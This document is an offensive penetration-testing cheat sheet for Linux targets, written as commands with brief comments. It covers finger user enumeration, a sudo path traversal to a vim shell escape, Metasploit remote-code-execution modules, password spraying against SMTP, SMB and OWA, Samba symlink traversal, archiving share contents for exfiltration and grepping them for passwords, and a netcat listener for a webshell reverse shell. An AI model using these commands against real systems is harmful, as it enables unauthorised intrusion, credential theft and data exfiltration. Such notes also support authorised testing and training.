### Linux Exploitation 
_1.1 Info Gathering_  
```
Finger
# nmap --script finger IPAddr -p79 //Query finger service for users
# finger sshd@IPAddr //display login specified for shell
# for name in $(cat /usr/share/wordlists/metasploit/unix_users.txt); do finger $name@IPAddr; done > valid_users.txt //Enumerate valid unix users using the finger service, loop

Local Information Gathering
Low Priv User
//wget linuxprivchecker to /tmp folder or local
$ python linuxprivchecker.py > enum //then can $cat enum |less to view results

sudo /usr/bin/apt edit-sources ../../../../../tmp/foo
//select /usr/bin/vim.basic if available, vim will let escape to shell
// in vim, :!sh for shell escape


```
_1.2 Remote Exploitation_  
```
exploit/multi/http/php_cgi_arg_injection //PHP up to version 5.3.12 and 5.4.2 is vulnerable
exploit/linux/misc/drb_remote_codeexec //Attacking Port 8787 Ruby DRb RMI

python -c 'import pty; pty.spawn("/bin/sh/")' //Upgrade shell

Password Spray Attack
//create a user name txt file
auxiliary/scanner/smtp/smtp_enum
//create list of validated user accounts
//perform reverse brute-force aka password spray using 1 or 2 max most common passwords against list of validated users
//more service login brute-force modules
auxiliary/scanner/smb/smb_login
auxiliary/scanner/http/owa_login

Exploiting Samba
//fingerprint samba service
nmap --script smb-os-discovery -p445 ipAddr
//Searchsploit Smb version

smbmap -H TargetAddress //determine shares available on SMB server, and permissions
//If have a WRITEABLE share, then can use symlink directory traversal
auxiliary/admin/smb/samba_symlink_traversal
smbclient \\\\TargetIP\\tmp -N //Login anonymously into share and change into created directory
tar c ../tmp/all_files.tar * //creates archive of all files in current directory for data exfiltration to local system's /tmp directory
tar xf /tmp/all_files.tar //extract and start enumerating files for sensitive content
grep -r "password" * 2>&1 /dev/null

//if www share writeable, can use a webshell for reverse shell. Ex. putting shell on www share and pointing browser to it
//Set up netcat listener to same as in webshell
nc -n -l -v -p 1234 
```
